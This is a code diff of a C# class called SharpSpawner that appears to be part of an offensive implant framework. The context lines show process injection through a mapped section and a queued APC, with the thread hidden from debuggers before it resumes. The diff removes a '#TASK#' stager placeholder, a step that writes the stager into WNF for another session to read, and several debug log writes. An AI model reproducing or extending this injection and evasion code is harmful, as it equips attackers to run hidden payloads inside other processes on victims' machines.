@@ -14,7 +14,6 @@ using System.Web.Script.Serialization;
 class SharpSpawner
 {
     static private string nutclr = "#NUTCLR#";
-    static private string task = "#TASK#";
 
     public SharpSpawner()
     {
@@ -88,25 +87,18 @@ class SharpSpawner
                         IntPtr th = procInfo.hThread;
                         IntPtr ptrq = Natives.ZwQueueApcThread(th, baseAddrEx, IntPtr.Zero);
                         Natives.ZwSetInformationThread(th, 1, IntPtr.Zero, 0);
-
-                        //Before resuming the thread we write the stager on wnf 
-                        //so it can be read from the spawned process from other session
-
-                        WriteWnF(task);
-
+                        
                         int rest = Natives.ZwResumeThread(th, out ulong outsupn);
 
                     }
                     else
                     {
                         Console.WriteLine("[x] Error mapping remote section");
-                        File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping remote section");
                     }
                 }
                 else
                 {
                     Console.WriteLine("[x] Error mapping section to current process");
-                    File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping section to current process");
                 }
 
                 Natives.CloseHandle(procInfo.hThread);
@@ -117,7 +109,6 @@ class SharpSpawner
             else
             {
                 Console.WriteLine("[x] Error creating process");
-                File.WriteAllText(@"c:\temp\log.txt", "[x] Error creating process " + Natives.GetLastError());
                 
             }
             Natives.CloseHandle(hProcTest);
@@ -127,7 +118,6 @@ class SharpSpawner
     catch (Exception e)
     {
         Console.WriteLine("[x] Generic error");
-        File.WriteAllText(@"c:\temp\log.txt", "[x] Generic error " + e.Message + " " + e.StackTrace);
     }
 }
 
